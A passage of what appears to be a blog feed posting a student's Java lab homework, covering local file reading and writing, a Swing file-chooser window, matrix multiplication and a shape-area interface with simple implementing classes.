class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shi_1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">String str=<span class="keyword">null</span>;</span><br><span class="line">String str1=<span class="keyword">null</span>;</span><br><span class="line">String name_1=<span class="string">"F:/myfile1.txt"</span>;</span><br><span class="line">String name_2=<span class="string">"F:/myfile2.txt"</span>;</span><br><span class="line">FileWriter w1=<span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">w1=<span class="keyword">new</span> FileWriter(name_1,<span class="keyword">true</span>);</span><br><span class="line">w1.write(<span class="string">"I am a student."</span>);</span><br><span class="line">w1.close();</span><br><span class="line">System.out.println(<span class="string">"myfile1.txt写入成功"</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">FileReader r1=<span class="keyword">null</span>;</span><br><span class="line">BufferedReader br1=<span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">r1=<span class="keyword">new</span> FileReader(name_1);</span><br><span class="line">br1=<span class="keyword">new</span> BufferedReader(r1);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">str=br1.readLine();</span><br><span class="line"><span class="comment">//System.out.println(str);</span></span><br><span class="line">br1.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">FileWriter w2=<span class="keyword">null</span>;</span><br><span class="line">BufferedWriter bw2=<span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">w2=<span class="keyword">new</span> FileWriter(name_2,<span class="keyword">true</span>);</span><br><span class="line">bw2=<span class="keyword">new</span> BufferedWriter(w2);</span><br><span class="line">bw2.write(str);</span><br><span class="line">bw2.flush();</span><br><span class="line">w2.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">FileReader r2=<span class="keyword">null</span>;</span><br><span class="line">BufferedReader br2=<span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">r2=<span class="keyword">new</span> FileReader(name_2);</span><br><span class="line">br2=<span class="keyword">new</span> BufferedReader(r2);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">str1=br2.readLine();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(str1);</span><br><span class="line">&#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/01/03/laCI56.png" alt="laCI56.png"></p><h3 id="三、"><a href="#三、" class="headerlink" title="三、"></a>三、</h3><p> 编写一个窗口程序，界面如下图，窗口FlowLayout布局，宽240，高200；文本框宽10，文本区大小为5行25列。  </p><p><img src="https://s2.ax1x.com/2020/01/03/laPAqs.png" alt="laPAqs.png"></p><p>要求实现下列功能：</p><p>1) 点击“打开文件”，则弹出打开文件对话框，可从(D盘根目录)中选择一个字符文件，然后将选择的文件名称显示在文本框中；</p><p>2) 点击“显示文件内容”，则读出打开的文件的内容，并将读取的内容显示在文本区中；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.BorderLayout;</span><br><span class="line"><span class="keyword">import</span> java.awt.EventQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.JFrame;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JLabel;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JPanel;</span><br><span class="line"><span class="keyword">import</span> javax.swing.border.EmptyBorder;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JButton;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JTextField;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JTextArea;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JComboBox;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JFileChooser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.Panel;</span><br><span class="line"><span class="keyword">import</span> java.awt.ScrollPane;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionListener;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">wenjian</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> JPanel contentPane;</span><br><span class="line"><span class="keyword">private</span> JTextField textField;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Launch the application.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">EventQueue.invokeLater(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">wenjian frame = <span class="keyword">new</span> wenjian();</span><br><span class="line">frame.setVisible(<span class="keyword">true</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create the frame.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">wenjian</span><span class="params">()</span> </span>&#123;</span><br><span class="line">setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class="line">setBounds(<span class="number">100</span>, <span class="number">100</span>, <span class="number">450</span>, <span class="number">300</span>);</span><br><span class="line">contentPane = <span class="keyword">new</span> JPanel();</span><br><span class="line">contentPane.setBorder(<span class="keyword">new</span> EmptyBorder(<span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>));</span><br><span class="line">setContentPane(contentPane);</span><br><span class="line">contentPane.setLayout(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">JButton btnNewButton = <span class="keyword">new</span> JButton(<span class="string">"\u6253\u5F00\u6587\u4EF6"</span>);</span><br><span class="line">btnNewButton.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent arg0)</span> </span>&#123;</span><br><span class="line">JFileChooser chooser = <span class="keyword">new</span> JFileChooser();</span><br><span class="line">        chooser.setFileSelectionMode(JFileChooser.FILES_AND_DIRECTORIES);</span><br><span class="line">        chooser.showDialog(<span class="keyword">new</span> JLabel(), <span class="string">"选择"</span>);</span><br><span class="line">        File file = chooser.getSelectedFile();</span><br><span class="line">        textField.setText(file.getAbsoluteFile().toString());</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">btnNewButton.setBounds(<span class="number">23</span>, <span class="number">11</span>, <span class="number">129</span>, <span class="number">42</span>);</span><br><span class="line">contentPane.add(btnNewButton);</span><br><span class="line"></span><br><span class="line">textField = <span class="keyword">new</span> JTextField();</span><br><span class="line">textField.setBounds(<span class="number">199</span>, <span class="number">21</span>, <span class="number">198</span>, <span class="number">22</span>);</span><br><span class="line">contentPane.add(textField);</span><br><span class="line">textField.setColumns(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">JTextArea textArea = <span class="keyword">new</span> JTextArea();</span><br><span class="line">textArea.setBounds(<span class="number">33</span>, <span class="number">68</span>, <span class="number">346</span>, <span class="number">112</span>);</span><br><span class="line">contentPane.add(textArea);</span><br><span class="line"></span><br><span class="line">JButton btnNewButton_1 = <span class="keyword">new</span> JButton(<span class="string">"\u663E\u793A\u6587\u4EF6\u5185\u5BB9"</span>);</span><br><span class="line">btnNewButton_1.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">FileReader fr=<span class="keyword">new</span> FileReader(textField.getText());</span><br><span class="line">BufferedReader br=<span class="keyword">new</span> BufferedReader(fr);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">textArea.setText(br.readLine());</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e1.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (FileNotFoundException e1) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e1.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">btnNewButton_1.setBounds(<span class="number">124</span>, <span class="number">192</span>, <span class="number">167</span>, <span class="number">41</span>);</span><br><span class="line">contentPane.add(btnNewButton_1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/01/03/laPniV.png" alt="laPniV.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Java第三次实验作业。&lt;/p&gt;
    
    </summary>
    
    
      <category term="java" scheme="https://1187100546.github.io/categories/java/"/>
    
    
      <category term="java" scheme="https://1187100546.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java第二次实验作业</title>
    <link href="https://1187100546.github.io/2019/12/30/java-2/"/>
    <id>https://1187100546.github.io/2019/12/30/java-2/</id>
    <published>2019-12-30T05:15:57.000Z</published>
    <updated>2020-01-03T08:11:58.692Z</updated>
    
    <content type="html"><![CDATA[<p>Java第二次实验作业。</p><a id="more"></a><h3 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h3><p>编写一个程序，其中设计一个矩阵类Matrix</p><p>Matrix类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Matrix</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> m,n;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span>[][]ma;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Matrix</span><span class="params">(<span class="keyword">int</span> m,<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.m = m;</span><br><span class="line">        <span class="keyword">this</span>.n = n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMa</span><span class="params">(<span class="keyword">int</span>[][]ma)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.ma = ma;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Matrix <span class="title">cheng</span><span class="params">(Matrix a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n != a.m) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        Matrix ans= <span class="keyword">new</span> Matrix(m,a.n);</span><br><span class="line">        <span class="keyword">int</span> ansm = m,ansn = a.n;</span><br><span class="line">        <span class="keyword">int</span>[][]ansa = <span class="keyword">new</span> <span class="keyword">int</span>[ansm][ansn];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ansm; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; ansn; j++) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; n; k++) &#123;</span><br><span class="line">                    ansa[i][j] += ma[i][k]*a.ma[k][j];  </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ans.ma = ansa;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                System.out.print(ma[i][j]+<span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Main类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw4;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main_matrix</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">"请输入矩阵A的行列数："</span>);</span><br><span class="line">        <span class="keyword">int</span> am = scanner.nextInt();</span><br><span class="line">        <span class="keyword">int</span> an = scanner.nextInt();</span><br><span class="line">        System.out.println(<span class="string">"请输入矩阵A："</span>);</span><br><span class="line">        Matrix matrixA = <span class="keyword">new</span> Matrix(am, an);</span><br><span class="line">        <span class="keyword">int</span>[][]ma = <span class="keyword">new</span> <span class="keyword">int</span>[am][an];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; am; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; an; j++) &#123;</span><br><span class="line">                ma[i][j] = scanner.nextInt(); </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        matrixA.setMa(ma);</span><br><span class="line">        System.out.println(<span class="string">"请输入矩阵B的行列数："</span>);</span><br><span class="line">        <span class="keyword">int</span> bm = scanner.nextInt();</span><br><span class="line">        <span class="keyword">int</span> bn = scanner.nextInt();</span><br><span class="line">        System.out.println(<span class="string">"请输入矩阵B："</span>);</span><br><span class="line">        Matrix matrixB = <span class="keyword">new</span> Matrix(bm, bn);</span><br><span class="line">        <span class="keyword">int</span>[][]mb = <span class="keyword">new</span> <span class="keyword">int</span>[bm][bn];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bm; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; bn; j++) &#123;</span><br><span class="line">                mb[i][j] = scanner.nextInt(); </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        matrixB.setMa(mb);</span><br><span class="line">        <span class="comment">//计算矩阵A乘矩阵B并打印结果</span></span><br><span class="line">        System.out.println(<span class="string">"A*B的结果为："</span>);</span><br><span class="line">        matrixA.cheng(matrixB).print();</span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/01/03/lUxlMn.png" alt="lUxlMn.png"></p><h3 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h3><p>设计一个程序，其中含有一个接口Shape(形状)，其中有求形状的面积的方法area()。再定义三个实现接口的类：三角型类、矩形类和圆类。在主方法中创建Shape类型的一维数组，它有三个元素，放置三个对象，分别表示三角形、矩形和圆，然后利用循环输出三个图形的面积。</p><p>Shape接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">shape</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">area</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Circle类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">circle</span> <span class="keyword">implements</span> <span class="title">shape</span> </span>&#123;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">float</span> pi=<span class="number">3.14f</span>;</span><br><span class="line"><span class="keyword">float</span> r;</span><br><span class="line">circle()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">circle(<span class="keyword">float</span> r)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.r=r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">area</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> pi*r*r;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Rectangle类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">rectangle</span> <span class="keyword">implements</span> <span class="title">shape</span></span>&#123;</span><br><span class="line"><span class="keyword">float</span> w;</span><br><span class="line"><span class="keyword">float</span> h;</span><br><span class="line">rectangle()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">rectangle(<span class="keyword">float</span> w,<span class="keyword">float</span> h)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.w=w;</span><br><span class="line"><span class="keyword">this</span>.h=h;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">area</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> w*h;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Square类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw4;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">square</span> <span class="keyword">implements</span> <span class="title">shape</span></span>&#123;</span><br><span class="line"><span class="keyword">float</span> a,b,c;</span><br><span class="line">square()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">square(<span class="keyword">float</span> a,<span class="keyword">float</span> b,<span class="keyword">float</span> c)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.a=a;</span><br><span class="line"><span class="keyword">this</span>.b=b;</span><br><span class="line"><span class="keyword">this</span>.c=c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">area</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">float</span> p=(a+b+c)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">return</span> Math.sqrt(p*(p-a)*(p-b)*(p-c));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 